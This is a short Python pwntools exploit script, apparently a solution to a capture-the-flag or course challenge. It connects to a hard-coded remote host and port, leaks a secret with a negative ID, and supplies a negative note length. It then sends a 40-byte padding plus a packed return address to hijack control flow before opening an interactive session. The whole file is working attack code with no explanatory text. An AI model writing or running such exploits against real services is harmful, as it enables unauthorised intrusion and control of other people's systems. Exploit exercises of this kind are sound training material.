from pwn import*

rem = remote('140.113.194.81', 20135)
###########################################################
recv_data = rem.recvuntil('Your choice: ',drop = False)
rem.sendline('1')
recv_data = rem.recvuntil('Please input id: ',drop = False)
rem.sendline('-1')
recv_data = rem.recvuntil('Age: ',drop = False)
secret_info = rem.recvline(keepends = False)
############################################################
recv_data = rem.recvuntil('Your choice: ',drop = False)
rem.sendline('2')
recv_data = rem.recvuntil('Please input secret first: ',drop = False)
rem.sendline(secret_info)
recv_data = rem.recvuntil('Please input id: ',drop = False)
rem.sendline('1')
recv_data = rem.recvuntil('Input new note length: ',drop = False)
rem.sendline('-1')
#############################################################
"""
Reference to http://docs.pwntools.com/en/stable/util/packing.html
"""
malicious_str = p32(0x08048a08)
magic1_addr = "A" * 40 +  str(malicious_str)
print('malicious_str is ', magic1_addr)
rem.sendline(magic1_addr)
# recv_data = rem.recvuntil('Your choice: ',drop = False)
rem.interactive()
# rem.sendline('3')
# print(recv_data)
# rem.sendline('3')
# rem.recvuntil('Congrats1!', drop = False)
print('end-----------------------------')
# rem.interactive()
# rem.send('-1\r\n')
